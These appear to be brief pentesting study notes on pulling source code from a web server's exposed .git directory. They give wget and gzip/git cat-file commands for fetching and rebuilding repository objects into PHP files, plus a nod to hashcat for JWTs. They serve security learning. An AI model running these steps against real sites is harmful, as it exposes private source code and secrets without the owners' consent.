## PTL Blue Random Notes

#### Git Information Leak

- wget -r http://<RHOST>/.git/
- git diff

#### JWT

- hashcat

## Git Information Leak II

- .git/config
- .git/HEAD
- .git/HEAD => refs/heads/master => .git/refs/heads/master
- 4eb80f585fec91b4d06aeb119230c9870dc494e1
- .git/objects/4e/b80f585fec91b4d06aeb119230c9870dc494e1
- file b80f585fec91b4d06aeb119230c9870dc494e1 => zlib compressed data
- printf "\x1f\x8b\x08\x00\x00\x00\x00\x00" |cat - b80f585fec91b4d06aeb119230c9870dc494e1 |gzip  -cd -q
- - .git/objects/58/ace0476093d04023f84d7816adacfa7b879c43
- printf "\x1f\x8b\x08\x00\x00\x00\x00\x00" |cat - ace0476093d04023f84d7816adacfa7b879c43 |gzip  -cd -q | strings -a
- mkdir /tmp/hack
- cd /tmp/hack
- git init 
- mkdir -p .git/objects/58 .git/objects/4e
- cp /tmp/ace0476093d04023f84d7816adacfa7b879c43 /tmp/hack/.git/objects/58/
- cp /tmp/b80f585fec91b4d06aeb119230c9870dc494e1 /tmp/hack/.git/objects/4e/
- git cat-file -p 58ace0476093d04023f84d7816adacfa7b879c43
- => 100644 blob 5adab1a1c52dc009d4f26bbce30dacc4c93eea33	footer.php
- => 100644 blob c3646db7f9c7e6f126c75900fdcce16d50e1da82	header.php
- => 100644 blob 88beb94b5e1fc48e1625c89f892b04bffb58225c	index.php
- .git/objects/5a/dab1a1c52dc009d4f26bbce30dacc4c93eea33 footer.php
- git cat-file -p 5adab1a1c52dc009d4f26bbce30dacc4c93eea33
- .git/objects/c3/646db7f9c7e6f126c75900fdcce16d50e1da82 header.php
- git cat-file -p c3646db7f9c7e6f126c75900fdcce16d50e1da82
- Some tools like Git-Money, DVCS-Pillage and GitTools automate the retrieval of the remote content.
